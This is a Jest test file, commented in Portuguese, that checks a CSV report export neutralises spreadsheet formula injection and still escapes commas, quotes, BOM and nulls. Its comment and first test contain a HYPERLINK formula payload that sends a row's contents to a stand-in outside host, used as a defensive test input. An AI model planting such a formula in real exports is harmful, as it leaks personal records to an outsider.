/**
 * Testes de exportação de relatório.
 *
 * O foco é a injeção de fórmula em planilha, que estava aberta: o CSV
 * escapava vírgula, aspas e quebra de linha, mas não o `=` inicial, e o
 * Excel gravava o valor cru. Excel e LibreOffice executam célula que começa
 * com `=`, `+`, `-`, `@`, tabulação ou retorno de carro.
 *
 * Em sistema de órgão público isso não é detalhe: as observações da visita
 * são texto livre digitado em campo, e uma célula com
 * `=HYPERLINK("http://fora.example/"&A1,"clique")` exfiltra a linha inteira
 * quando alguém da secretaria abre o arquivo.
 */
import { exportarCSV } from '../relatorioService';

const colunas = [
  { header: 'Agente', key: 'Agente' },
  { header: 'Observações', key: 'Observações' },
];

/** Captura o texto que seria baixado, sem tocar no sistema de arquivos. */
let conteudoBaixado = '';

beforeEach(() => {
  conteudoBaixado = '';

  // O Blob do jsdom não devolve o texto de forma sincrona, então
  // interceptamos na construção.
  global.URL.createObjectURL = jest.fn(() => 'blob:fake');
  global.URL.revokeObjectURL = jest.fn();

  const BlobOriginal = global.Blob;
  // @ts-expect-error substituição controlada só para o teste
  global.Blob = class extends BlobOriginal {
    constructor(partes: BlobPart[], opcoes?: BlobPropertyBag) {
      super(partes, opcoes);
      conteudoBaixado = partes.map((p) => String(p)).join('');
    }
  };

  jest.spyOn(document, 'createElement').mockImplementation(((tag: string) => {
    if (tag === 'a') {
      return { href: '', download: '', click: jest.fn() } as unknown as HTMLElement;
    }
    return document.createElementNS('http://www.w3.org/1999/xhtml', tag) as HTMLElement;
  }) as typeof document.createElement);
});

afterEach(() => {
  jest.restoreAllMocks();
});

describe('exportarCSV - injecao de formula', () => {
  it('neutraliza celula que comeca com = ', () => {
    exportarCSV(
      [{ Agente: 'Ana', 'Observações': '=HYPERLINK("http://fora.example/"&A1,"x")' }],
      'teste',
      colunas
    );

    expect(conteudoBaixado).toContain("'=HYPERLINK");
    // Sem o apóstrofo, a célula abriria como fórmula.
    expect(conteudoBaixado).not.toMatch(/(^|[,"\n])=HYPERLINK/);
  });

  it.each(['+1+1', '-1+1', '@SUM(A1)', '\tvalor', '\rvalor'])(
    'neutraliza celula que comeca com %j',
    (perigoso) => {
      exportarCSV([{ Agente: 'Ana', 'Observações': perigoso }], 'teste', colunas);

      expect(conteudoBaixado).toContain(`'${perigoso}`);
    }
  );

  it('nao mexe em texto comum', () => {
    exportarCSV(
      [{ Agente: 'Ana', 'Observações': 'Paciente orientada sobre o sal' }],
      'teste',
      colunas
    );

    expect(conteudoBaixado).toContain('Paciente orientada sobre o sal');
    expect(conteudoBaixado).not.toContain("'Paciente");
  });

  it('continua escapando virgula e aspas', () => {
    exportarCSV(
      [{ Agente: 'Ana', 'Observações': 'dor, febre e "tosse"' }],
      'teste',
      colunas
    );

    expect(conteudoBaixado).toContain('"dor, febre e ""tosse"""');
  });

  it('grava BOM para o Excel reconhecer acento', () => {
    exportarCSV([{ Agente: 'Ana', 'Observações': 'Avaliação' }], 'teste', colunas);

    expect(conteudoBaixado.charCodeAt(0)).toBe(0xfeff);
    expect(conteudoBaixado).toContain('Avaliação');
  });

  it('valor nulo vira celula vazia e nao a palavra null', () => {
    exportarCSV([{ Agente: 'Ana', 'Observações': null }], 'teste', colunas);

    expect(conteudoBaixado).not.toContain('null');
  });
});
